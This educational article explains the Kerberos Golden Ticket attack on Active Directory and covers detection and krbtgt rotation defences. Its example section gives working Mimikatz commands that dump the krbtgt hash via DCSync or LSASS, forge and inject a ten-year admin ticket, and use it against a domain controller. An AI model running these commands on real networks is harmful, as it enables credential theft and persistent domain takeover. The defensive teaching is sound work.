---
title: "Golden Ticket"
---

**Disclaimer:** This information is provided for educational purposes only. Attempting these techniques on systems you do not have explicit, authorized permission to test is illegal and unethical. Always operate within legal and ethical boundaries.

## 1. Introduction

A Golden Ticket attack is a powerful post-exploitation technique used in Microsoft Active Directory (AD) environments. It allows an attacker who has already compromised high-level privileges (typically Domain Admin or equivalent) to forge Kerberos Ticket Granting Tickets (TGTs) for *any* user in the domain, including non-existent ones. This grants the attacker persistent, long-term, and often difficult-to-detect access to domain resources, effectively making them a Domain Admin (or any other user they choose) for as long as the underlying credential used to create the ticket remains valid.

The attack leverages fundamental aspects of the Kerberos authentication protocol by compromising the master key of the domain's Kerberos service: the NTLM hash of the `krbtgt` account.

## 2. Background: Kerberos Authentication (Simplified)

To understand the Golden Ticket, you need a basic grasp of Kerberos:

1.  **Authentication Service (AS) Exchange:** A user logs in. Their client requests a TGT from the Key Distribution Center's (KDC) Authentication Service. The KDC verifies the user's credentials (using their password hash) and issues an encrypted TGT. The TGT contains information about the user (like their SID and group memberships) and is encrypted with the `krbtgt` account's NTLM hash.
2.  **Ticket Granting Service (TGS) Exchange:** When the user wants to access a specific service (e.g., a file share), their client presents the TGT to the KDC's Ticket Granting Service. The TGS validates the TGT (by decrypting it with the `krbtgt` hash) and issues a Service Ticket (ST) specific to the requested service. The ST is encrypted with the service account's password hash.
3.  **Application Server (AP) Exchange:** The client presents the ST to the application server hosting the service. The server decrypts the ST (using its own hash) and grants access based on the validated user information within the ticket.

The **TGT** is crucial because it authenticates the user to the KDC for obtaining further Service Tickets without needing to re-enter credentials constantly.

## 3. The `krbtgt` Account

* This is a built-in, disabled user account in Active Directory.
* Its primary purpose is to act as the service account for the KDC.
* The NTLM password hash of this account is used by the KDC to encrypt and decrypt TGTs.
* **Crucially, compromising the NTLM hash of the `krbtgt` account allows anyone possessing it to create valid TGTs.**

## 4. How the Golden Ticket Attack Works

The attack flow typically involves these steps:

1.  **Initial Compromise:** The attacker must first gain high-level privileges within the domain, usually Domain Administrator rights or equivalent privileges allowing them to run code on a Domain Controller (DC) or extract credentials remotely. This is a prerequisite, not part of the Golden Ticket attack itself.
2.  **Extract `krbtgt` Hash:** The attacker uses tools to extract the NTLM hash of the `krbtgt` account from a Domain Controller's memory (LSASS process) or the AD database (`ntds.dit`).
3.  **Gather Domain Information:** The attacker needs the Domain Name and the Domain Security Identifier (SID).
4.  **Forge the TGT (Create the Golden Ticket):** Using specialized tools (like Mimikatz), the attacker constructs a fake TGT. They can specify:
    * The username to impersonate (can be *any* user, even fake ones).
    * The Domain Name and SID.
    * The target user's desired User ID (RID - often `500` for the built-in Administrator).
    * Desired group memberships (e.g., Domain Admins, Enterprise Admins).
    * Ticket lifetime (can be set to years, e.g., 10 years is common).
    * The extracted `krbtgt` NTLM hash (used to encrypt the ticket).
5.  **Inject/Use the Ticket:** The attacker injects the forged TGT into their current logon session's memory.
6.  **Access Resources:** With the injected Golden Ticket, the attacker's machine can now request Service Tickets from the TGS for any service in the domain, appearing as the user specified in the forged TGT (e.g., Domain Administrator). They can access any resource that user is authorized to access (file shares, remote command execution, DCs, etc.).

## 5. Tools

* **Mimikatz:** The quintessential tool for Golden Ticket attacks, developed by Benjamin Delpy. It can extract hashes and forge tickets.
* **Impacket:** A collection of Python classes for working with network protocols. Scripts like `secretsdump.py` can remotely extract hashes (including `krbtgt`), and `ticketer.py` can forge tickets. Useful for Linux-based attackers.
* **Rubeus:** A C# toolset for raw Kerberos interaction and abuse. It can perform DCSync to get the hash and forge/use tickets.

## 6. Example Scenario (using Mimikatz on a compromised machine)

**Assumptions:**
* Attacker has Domain Admin rights and is running commands on a compromised machine within the domain (or directly on a DC).
* Target Domain: `contoso.local`

**Steps:**

1.  **Elevate Privileges:** Ensure Mimikatz is run with Administrator privileges.
    ```powershell
    # In Mimikatz console
    privilege::debug
    ```

2.  **Extract `krbtgt` Hash and Domain SID:**
    The easiest way (if you have the rights) is DCSync, which mimics domain replication behavior.
    ```powershell
    # In Mimikatz console
    lsadump::dcsync /domain:contoso.local /user:krbtgt
    ```
    This will output information about the `krbtgt` account, including:
    * The Domain SID (e.g., `S-1-5-21-xxxxxxxxxx-yyyyyyyyyy-zzzzzzzzzz`)
    * The NTLM hash (e.g., `abcdef1234567890abcdef1234567890`)

    *Alternatively, if running directly on a DC:*
    ```powershell
    # In Mimikatz console
    # (Optional: Patch LSASS if needed, may trigger AV/EDR)
    # misc::memssp
    # (Extract from LSASS memory)
    sekurlsa::krbtgt
    ```
    *Or obtain the `ntds.dit` file offline and extract it.*

3.  **Forge the Golden Ticket:**
    Let's forge a ticket for the user "Administrator" (RID 500), making them a member of Domain Admins (RID 512), Enterprise Admins (RID 519), etc.
    ```powershell
    # In Mimikatz console
    kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-xxxxxxxxxx-yyyyyyyyyy-zzzzzzzzzz /krbtgt:abcdef1234567890abcdef1234567890 /id:500 /groups:512,519 /ptt
    ```
    * `/user`: The username to impersonate.
    * `/domain`: The target domain name.
    * `/sid`: The domain SID (obtained in step 2).
    * `/krbtgt`: The NTLM hash of the `krbtgt` account (obtained in step 2).
    * `/id`: The Relative Identifier (RID) of the user to impersonate. `500` is typically the built-in Administrator.
    * `/groups` (Optional): Comma-separated RIDs of groups to add to the ticket (e.g., `512`=Domain Admins, `519`=Enterprise Admins). Defaults usually include key admin groups.
    * `/ptt`: Pass-the-Ticket. Injects the forged ticket directly into the current session's memory. Alternatively, use `/ticket:golden.kirbi` to save it to a file.

4.  **Verify and Use the Ticket:**
    ```powershell
    # In Mimikatz console
    kerberos::list
    # Look for the newly injected ticket

    # From a regular command prompt or PowerShell window (same session)
    klist
    # Verify the ticket is present

    # Access a protected resource on a Domain Controller (e.g., DC01)
    dir \\DC01\c$
    # Try running commands remotely
    psexec \\DC01 cmd.exe
    ```
    If successful, you now have access as if you were the Administrator user defined in the ticket, regardless of the user you are actually logged in as on the compromised machine.

## 7. Detection

Detecting Golden Tickets is challenging because forged tickets appear legitimate to the KDC (they are correctly encrypted). Detection relies on finding anomalies and monitoring for prerequisites:

1.  **Monitor `krbtgt` Account Changes:** The `krbtgt` password should *never* change outside of a deliberate, planned rotation process. Event ID `4724` (An attempt was made to reset an account's password) for the `krbtgt` account is highly suspicious if unplanned.
2.  **Monitor for DCSync Activity:** Look for network traffic patterns indicative of DCSync (`DRSUAPI` replication requests) originating from non-DC machines or unexpected accounts. Event ID `4662` (An operation was performed on an object) on the domain root object for specific replication rights (`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`) can indicate DCSync attempts.
3.  **Analyze Kerberos Ticket Properties (Advanced):**
    * **Ticket Lifetime:** Golden Tickets often have unusually long lifetimes (e.g., 10 years default in Mimikatz) compared to standard domain policy (e.g., 10 hours). Monitor Event ID `4769` (A Kerberos service ticket was requested) for tickets with excessive lifetimes.
    * **Encryption Types:** Forged tickets might use older/weaker encryption algorithms (like RC4-HMAC) if the attacker doesn't specify otherwise, especially if newer ones like AES are standard in the domain.
    * **SID History Anomalies:** Attackers might inject SIDs into the SID History field of the ticket to gain extra privileges. Monitor for unexpected SIDs there.
    * **Account Anomalies:** TGTs issued for disabled or non-existent accounts.
4.  **Endpoint Detection and Response (EDR):** Monitor for execution of tools like `Mimikatz`, `Rubeus`, or suspicious PowerShell commands related to credential dumping or Kerberos ticket manipulation (`sekurlsa::`, `lsadump::`, `kerberos::`). Look for direct access to the LSASS process memory.
5.  **Network Traffic Analysis:** Look for Kerberos traffic originating from unusual sources or showing anomalous patterns. TGT requests (`AS-REQ`) should normally only come when a user logs on or needs to renew their TGT. Frequent Service Ticket requests (`TGS-REQ`) without preceding TGT requests might indicate an injected ticket.
6.  **Log Correlation (SIEM/UEBA):** Correlate login events (Event ID `4624`), service ticket requests (`4769`), and resource access logs. User and Entity Behavior Analytics (UEBA) can help baseline normal activity and flag deviations potentially indicative of a Golden Ticket (e.g., an "admin" account suddenly active from a user workstation it never used before).

## 8. Prevention and Mitigation

Preventing the *creation* of a Golden Ticket hinges on protecting the `krbtgt` hash. Mitigating its *impact* involves limiting the attacker's ability to use it and detecting it quickly.

1.  **Protect Domain Controllers:** DCs are the crown jewels.
    * **Strict Access Control:** Limit who can log onto DCs (physically and remotely). Use jump servers/Privileged Access Workstations (PAWs).
    * **Patching and Hardening:** Keep DCs fully patched and securely configured. Disable legacy protocols. Use firewalls.
2.  **Limit Domain Admin Accounts:** The fewer accounts with the ability to compromise a DC, the better. Follow the principle of least privilege. Use Tiered Administration models.
3.  **Privileged Access Management (PAM):** Implement PAM solutions to manage and monitor privileged account usage, providing just-in-time (JIT) access.
4.  **Credential Guard (Windows 10/Server 2016+):** Helps protect LSASS memory from credential dumping techniques using virtualization-based security (VBS). This makes extracting the `krbtgt` hash (and other credentials) from memory much harder.
5.  **Regularly Rotate `krbtgt` Password:** This is the *most direct* countermeasure.
    * **Procedure:** The password must be changed **TWICE** with a delay between changes (e.g., >10-24 hours, longer than the domain's max ticket lifetime).
    * **Why Twice?** AD keeps the current and previous `krbtgt` password hash to validate existing tickets. Changing it once invalidates tickets created with the *oldest* hash but allows tickets created with the *previous* hash to still work. The second change purges the hash the attacker likely possesses, invalidating any Golden Tickets created with it.
    * **Caution:** This is a significant operation. Plan carefully as it invalidates all existing TGTs, potentially causing temporary disruption if not managed well. Perform during a maintenance window. Microsoft provides scripts to assist (`Reset-KrbTgtPassword.ps1`).
6.  **Monitoring and Detection:** Implement the detection strategies outlined above (EDR, SIEM, UEBA, specific event log monitoring).
7.  **Reduce Kerberos Delegation:** Limit the use of Unconstrained Delegation, which can expose TGTs. Use Constrained or Resource-Based Constrained Delegation where possible.
8.  **Enable AES Encryption for Kerberos:** Configure AD to support and prefer AES128/AES256 encryption for Kerberos. Ensure the `krbtgt` account itself supports AES (requires domain functional level 2008 or higher and potentially manual steps). This makes RC4-based attacks less likely.

## 9. Conclusion

The Golden Ticket attack remains one of the most potent persistence techniques in Active Directory. Its power stems from exploiting the core `krbtgt` account, allowing attackers to bypass normal authentication controls almost indefinitely. While preventing the initial compromise is paramount, specific defenses focus on rigorously protecting Domain Controllers, limiting privileged access, enabling modern security features like Credential Guard, and critically, having a plan to rotate the `krbtgt` password securely. Robust detection capabilities focusing on credential theft, abnormal Kerberos ticket activity, and DCSync attempts are essential for identifying this attack before significant damage occurs.